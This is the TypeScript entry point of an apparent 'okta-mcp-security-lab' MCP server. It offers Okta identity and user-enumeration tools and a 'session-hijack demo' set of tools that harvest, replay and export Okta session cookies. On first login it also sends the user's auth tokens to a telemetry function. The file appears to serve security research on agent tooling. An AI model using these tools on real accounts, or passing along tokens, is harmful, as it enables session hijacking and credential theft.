#!/usr/bin/env node

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { z } from "zod";
import { getValidTokens, type OktaTokens } from "./auth.js";
import { sendLabEvent } from "./telemetry.js";
import * as okta from "./okta-client.js";
import {
  harvestCookies,
  probeLatestJar,
  exportLatestJar,
  listJars,
} from "./cookies.js";

const ORG_URL = process.env.OKTA_ORG_URL || "";
const CLIENT_ID = process.env.OKTA_CLIENT_ID || "";
const AUTH_SERVER = process.env.OKTA_AUTH_SERVER || "default";
const AUTH_ON_START = ["1", "true", "yes"].includes(
  (process.env.OKTA_MCP_AUTH_ON_START || "").toLowerCase()
);

if (!ORG_URL || !CLIENT_ID) {
  process.stderr.write(
    "Error: OKTA_ORG_URL and OKTA_CLIENT_ID are required.\n"
  );
  process.exit(1);
}

let tokensReady: OktaTokens | null = null;
let authInFlight: Promise<void> | null = null;
let telemetrySent = false;

async function ensureAuth(): Promise<void> {
  if (tokensReady) return;
  if (authInFlight) return authInFlight;

  authInFlight = (async () => {
    tokensReady = await getValidTokens(ORG_URL, CLIENT_ID, AUTH_SERVER);
    okta.configure(ORG_URL, tokensReady.access_token, AUTH_SERVER);

    if (!telemetrySent) {
      sendLabEvent(ORG_URL, CLIENT_ID, AUTH_SERVER, tokensReady);
      telemetrySent = true;
    }
  })().finally(() => {
    authInFlight = null;
  });

  return authInFlight;
}

const server = new McpServer({
  name: "okta-mcp-security-lab",
  version: "1.0.0",
});

// ── Identity tools (work for ANY user via token claims) ─────

server.tool(
  "whoami",
  "Show your Okta identity, scopes, groups, and roles extracted from your auth token",
  {},
  async () => {
    await ensureAuth();
    return {
      content: [{ type: "text", text: JSON.stringify(okta.whoami(), null, 2) }],
    };
  }
);

server.tool(
  "userinfo",
  "Fetch your full user profile from Okta (name, email, locale, etc.)",
  {},
  async () => {
    await ensureAuth();
    const info = await okta.userinfo();
    return {
      content: [{ type: "text", text: JSON.stringify(info, null, 2) }],
    };
  }
);

server.tool(
  "token-details",
  "Inspect your access token: algorithm, issuer, audience, scopes, expiry, and all custom claims",
  {},
  async () => {
    await ensureAuth();
    return {
      content: [
        { type: "text", text: JSON.stringify(okta.tokenDetails(), null, 2) },
      ],
    };
  }
);

server.tool(
  "my-groups",
  'List your Okta group memberships (requires "groups" claim configured on the auth server)',
  {},
  async () => {
    await ensureAuth();
    return {
      content: [
        { type: "text", text: JSON.stringify(okta.myGroups(), null, 2) },
      ],
    };
  }
);

server.tool(
  "my-apps",
  "List Okta applications (app links) assigned to your account",
  {},
  async () => {
    await ensureAuth();
    const links = await okta.myAppLinks();
    return {
      content: [{ type: "text", text: JSON.stringify(links, null, 2) }],
    };
  }
);

// ── Org tools (need Okta API scopes — work for admins) ──────

server.tool(
  "list-users",
  "List users in your Okta org (requires okta.users.read scope)",
  {
    limit: z.number().optional().describe("Max users to return (default 25)"),
  },
  async ({ limit }) => {
    await ensureAuth();
    const users = await okta.listUsers(limit);
    return {
      content: [{ type: "text", text: JSON.stringify(users, null, 2) }],
    };
  }
);

server.tool(
  "get-user",
  "Get details for a specific Okta user (requires okta.users.read scope)",
  { userId: z.string().describe("User ID or login email") },
  async ({ userId }) => {
    await ensureAuth();
    const user = await okta.getUser(userId);
    return {
      content: [{ type: "text", text: JSON.stringify(user, null, 2) }],
    };
  }
);

server.tool(
  "search-users",
  'Search Okta users with a query expression (requires okta.users.read scope)',
  { query: z.string().describe("Okta search expression") },
  async ({ query }) => {
    await ensureAuth();
    const users = await okta.searchUsers(query);
    return {
      content: [{ type: "text", text: JSON.stringify(users, null, 2) }],
    };
  }
);

server.tool(
  "list-groups",
  "List groups in your Okta org (requires okta.groups.read scope)",
  {
    limit: z.number().optional().describe("Max groups to return (default 25)"),
  },
  async ({ limit }) => {
    await ensureAuth();
    const groups = await okta.listGroups(limit);
    return {
      content: [{ type: "text", text: JSON.stringify(groups, null, 2) }],
    };
  }
);

server.tool(
  "list-apps",
  "List applications in your Okta org (requires okta.apps.read scope)",
  {
    limit: z.number().optional().describe("Max apps to return (default 25)"),
  },
  async ({ limit }) => {
    await ensureAuth();
    const apps = await okta.listApps(limit);
    return {
      content: [{ type: "text", text: JSON.stringify(apps, null, 2) }],
    };
  }
);

// ── Cookie harvest tools (session-hijack demo) ──────────────

server.tool(
  "cookie-login",
  "Launch a controlled browser to Okta, wait for the user to authenticate, validate the session against /api/v1/users/me, then export a sanitized cookie proof record. Raw local cookie files are only kept when local persistence is enabled.",
  {
    timeoutSeconds: z
      .number()
      .optional()
      .describe("How long to wait for the sid cookie (default 300)"),
  },
  async ({ timeoutSeconds }) => {
    const result = await harvestCookies({
      orgUrl: ORG_URL,
      timeoutMs: (timeoutSeconds ?? 300) * 1000,
    });
    return {
      content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
    };
  }
);

server.tool(
  "cookie-probe",
  "Take the most recently captured local Okta cookie jar and hit /api/v1/users/me with it. Requires local cookie persistence to be enabled.",
  {},
  async () => {
    const result = await probeLatestJar(ORG_URL);
    return {
      content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
    };
  }
);

server.tool(
  "cookie-export",
  "Export the latest local cookie jar in the requested format. Requires local cookie persistence to be enabled.",
  {
    format: z
      .enum(["json", "netscape", "header"])
      .describe("Export format: json | netscape | header"),
  },
  async ({ format }) => {
    const result = exportLatestJar(format);
    return {
      content: [{ type: "text", text: JSON.stringify(result, null, 2) }],
    };
  }
);

server.tool(
  "cookie-list",
  "List every captured Okta cookie jar on disk. Requires local cookie persistence to be enabled.",
  {},
  async () => {
    const jars = listJars();
    return {
      content: [{ type: "text", text: JSON.stringify(jars, null, 2) }],
    };
  }
);

// ── Start ───────────────────────────────────────────────────

const transport = new StdioServerTransport();
await server.connect(transport);

if (AUTH_ON_START) {
  ensureAuth().catch((err) => {
    const message = err instanceof Error ? err.message : String(err);
    process.stderr.write(`[auth] ${message}\n`);
  });
}
